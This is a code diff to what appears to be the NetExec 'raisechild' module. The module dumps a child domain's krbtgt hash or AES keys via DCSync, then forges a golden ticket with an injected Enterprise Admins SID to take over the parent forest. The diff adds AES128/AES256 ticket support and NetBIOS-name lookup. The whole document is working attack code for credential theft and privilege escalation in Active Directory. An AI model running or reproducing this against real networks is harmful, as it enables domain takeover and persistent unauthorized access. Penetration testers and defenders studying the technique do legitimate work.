@@ -21,6 +21,13 @@ from impacket.dcerpc.v5.dtypes import SID, RPC_SID, NULL
 from nxc.parsers.ldap_results import parse_result_attributes
 from nxc.helpers.misc import CATEGORY
 
+# Encryption type configurations: enctype, checksum, signature size, session key size
+ETYPE_CONFIG = {
+    "rc4": (EncryptionTypes.rc4_hmac.value, ChecksumTypes.hmac_md5.value, 16, 16),
+    "aes128": (EncryptionTypes.aes128_cts_hmac_sha1_96.value, ChecksumTypes.hmac_sha1_96_aes128.value, 12, 16),
+    "aes256": (EncryptionTypes.aes256_cts_hmac_sha1_96.value, ChecksumTypes.hmac_sha1_96_aes256.value, 12, 32),
+}
+
 
 class NXCModule:
     """Module made by @azoxlpf"""
@@ -40,6 +47,9 @@ class NXCModule:
         self.valid_tgt = None
         self.new_ticket = None
         self.krbtgt_hash = ""
+        self.aes128_key = ""
+        self.aes256_key = ""
+        self.etype = "rc4"
 
     def options(self, context, module_options):
         """
@@ -49,14 +59,17 @@ class NXCModule:
         USER        Target username to forge the ticket for (default: Administrator)
         USER_ID     RID used as the user ID in the PAC (default: 500)
         RID         RID used for the extra SID (default: 519 = Enterprise Admins)
+        ETYPE       Encryption type for the ticket: rc4, aes128, aes256 (default: rc4)
 
         Examples:
         netexec ldap <ip> -u <username> -p <password> -M raisechild -o USER=DC01$
         netexec ldap <ip> -u <username> -p <password> -M raisechild -o USER_ID=1001
         netexec ldap <ip> -u <username> -p <password> -M raisechild -o RID=512
+        netexec ldap <ip> -u <username> -p <password> -M raisechild -o ETYPE=aes256
         """
         self.context = context
         self.module_options = module_options
+        self.etype = module_options.get("ETYPE", "rc4").lower()
 
     def on_admin_login(self, context, connection):
         self.context = context
@@ -146,6 +159,15 @@ class NXCModule:
             smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
         return smb
 
+    def _get_domain_netbios(self, ldap_conn):
+        resp = ldap_conn.search(
+            baseDN=f"CN=Partitions,{ldap_conn.configuration_context}",
+            searchFilter=f"(&(objectCategory=crossRef)(dnsRoot={ldap_conn.targetDomain})(nETBIOSName=*))",
+            attributes=["nETBIOSName"],
+        )
+        entries = parse_result_attributes(resp)
+        return entries[0]["nETBIOSName"]
+
     def _dcsync_krbtgt(self, smb_conn, ldap_conn):
         try:
             rop = RemoteOperations(
@@ -154,15 +176,19 @@ class NXCModule:
                 kdcHost=ldap_conn.kdcHost,
             )
             rop.enableRegistry()
-            rop.getDrsr()
             boot_key = rop.getBootKey()
 
-            domain_netbios = ldap_conn.domain.split(".")[0]
+            domain_netbios = self._get_domain_netbios(ldap_conn)
             target_user = f"{domain_netbios}/krbtgt"
 
             def grab_hash(secret_type, secret):
-                if secret.lower().startswith("krbtgt:"):
+                if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
                     self.krbtgt_hash = secret
+                elif secret_type == NTDSHashes.SECRET_TYPE.NTDS_KERBEROS:
+                    if "aes256-cts-hmac-sha1-96" in secret.lower():
+                        self.aes256_key = secret.split(":")[-1]
+                    elif "aes128-cts-hmac-sha1-96" in secret.lower():
+                        self.aes128_key = secret.split(":")[-1]
 
             ntds = NTDSHashes(
                 None,
@@ -170,17 +196,19 @@ class NXCModule:
                 isRemote=True,
                 noLMHash=True,
                 remoteOps=rop,
-                justNTLM=True,
+                justNTLM=self.etype == "rc4",
                 justUser=target_user,
                 printUserStatus=False,
                 perSecretCallback=grab_hash,
             )
             ntds.dump()
 
-            if self.krbtgt_hash:
-                self.context.log.highlight(f"krbtgt hash from {ldap_conn.domain}: {self.krbtgt_hash}")
+            secret = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}.get(self.etype)
+            label = "hash" if self.etype == "rc4" else f"{self.etype.upper()} key"
+            if secret:
+                self.context.log.highlight(f"krbtgt {label}: {secret}")
             else:
-                self.context.log.fail("DCSync completed - krbtgt hash not found!")
+                self.context.log.fail(f"DCSync completed - krbtgt {label} not found!")
         except DCERPCSessionError as e:
             self.context.log.fail(f"RPC DRSUAPI error: {e}")
         except Exception as e:
@@ -203,24 +231,22 @@ class NXCModule:
             self.context.log.fail(f"Error during DCSync: {e}")
             return
 
-        if self.krbtgt_hash:
+        if (self.etype == "rc4" and self.krbtgt_hash) or (self.etype == "aes128" and self.aes128_key) or (self.etype == "aes256" and self.aes256_key):
             try:
                 tgt = self.forge_golden_ticket(connection)
-                self.context.log.success(f"Golden ticket forged successfully. Saved to: {tgt}")
+                self.context.log.success(f"Golden ticket forged successfully (etype: {self.etype}). Saved to: {tgt}")
                 self.context.log.success(f"Run the following command to use the TGT: export KRB5CCNAME={tgt}")
                 self.forged_tgt = tgt
             except Exception as e:
                 self.context.log.fail(f"Error while generating golden ticket : {e}")
         else:
-            self.context.log.fail("Cannot forge ticket: krbtgt hash missing.")
+            self.context.log.fail(f"Cannot forge ticket: required hash/key for etype '{self.etype}' not found.")
 
     def forge_golden_ticket(self, connection):
         """
-        Forge a golden ticket for the parent domain using the krbtgt NT-hash.
-        Supports optional USER, RID and USER_ID module options.
+        Forge a golden ticket for the parent domain using the krbtgt key.
+        Supports optional USER, RID, USER_ID and ETYPE module options.
         """
-        nthash = self._clean_nthash(self.krbtgt_hash)
-
         admin_name = self.module_options.get("USER", "Administrator")
         extra_rid = str(self.module_options.get("RID", "519"))
         extra_sid = f"{self.parent_sid}-{extra_rid}"
@@ -230,15 +256,17 @@ class NXCModule:
         groups_list = [513, 512, 520, 518, 519]
 
         # Create ticket
-        enctype_value = EncryptionTypes.rc4_hmac.value
-        krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(nthash))
+        enctype_value, checksum_type, sig_size, key_size = ETYPE_CONFIG[self.etype]
+        key_map = {"rc4": self.krbtgt_hash, "aes128": self.aes128_key, "aes256": self.aes256_key}
+        raw_key = self._clean_nthash(key_map[self.etype]) if self.etype == "rc4" else key_map[self.etype]
+        krbtgt_key = Key(_enctype_table[enctype_value].enctype, unhexlify(raw_key))
 
         validation_info = self._createBasicValidationInfo(admin_name, domain_upper, self.child_sid, groups_list, int(user_rid))
-        pac_infos = self._createBasicPac(validation_info, admin_name)
+        pac_infos = self._createBasicPac(validation_info, admin_name, checksum_type, sig_size)
         self._createRequestorInfoPac(pac_infos, self.child_sid, int(user_rid))
 
         as_rep = self._buildAsrep(domain_upper, admin_name, enctype_value)
-        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(as_rep, domain_upper, admin_name, 87600, enctype_value, pac_infos)
+        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(as_rep, domain_upper, admin_name, 87600, enctype_value, pac_infos, key_size)
 
         self._injectExtraSids(pac_infos, extra_sid)
 
@@ -335,16 +363,16 @@ class NXCModule:
         validation_info["Data"] = kerbdata
         return validation_info
 
-    def _createBasicPac(self, validation_info: VALIDATION_INFO, username: str) -> dict:
+    def _createBasicPac(self, validation_info: VALIDATION_INFO, username: str, checksum_type: int, sig_size: int) -> dict:
         pac_infos: dict[int, bytes] = {}
         pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()
 
         server_checksum_placeholder = PAC_SIGNATURE_DATA()
         private_checksum_placeholder = PAC_SIGNATURE_DATA()
-        server_checksum_placeholder["SignatureType"] = ChecksumTypes.hmac_md5.value
-        private_checksum_placeholder["SignatureType"] = ChecksumTypes.hmac_md5.value
-        server_checksum_placeholder["Signature"] = b"\x00" * 16
-        private_checksum_placeholder["Signature"] = b"\x00" * 16
+        server_checksum_placeholder["SignatureType"] = checksum_type
+        private_checksum_placeholder["SignatureType"] = checksum_type
+        server_checksum_placeholder["Signature"] = b"\x00" * sig_size
+        private_checksum_placeholder["Signature"] = b"\x00" * sig_size
         pac_infos[PAC_SERVER_CHECKSUM] = server_checksum_placeholder.getData()
         pac_infos[PAC_PRIVSVR_CHECKSUM] = private_checksum_placeholder.getData()
 
@@ -422,8 +450,7 @@ class NXCModule:
 
         pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()
 
-    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int,
-                            enctype_value: int, pac_infos: dict) -> tuple[EncASRepPart, EncTicketPart, dict]:
+    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int, enctype_value: int, pac_infos: dict, key_size: int) -> tuple[EncASRepPart, EncTicketPart, dict]:
         now_utc = datetime.datetime.now(datetime.timezone.utc)
         end_utc = now_utc + datetime.timedelta(hours=duration_hours)
 
@@ -438,7 +465,7 @@ class NXCModule:
 
         enc_ticket_part["key"] = noValue
         enc_ticket_part["key"]["keytype"] = enctype_value
-        enc_ticket_part["key"]["keyvalue"] = os.urandom(16)  # RC4 -> 16 bytes
+        enc_ticket_part["key"]["keyvalue"] = os.urandom(key_size)
 
         enc_ticket_part["crealm"] = domain
         enc_ticket_part["cname"] = noValue
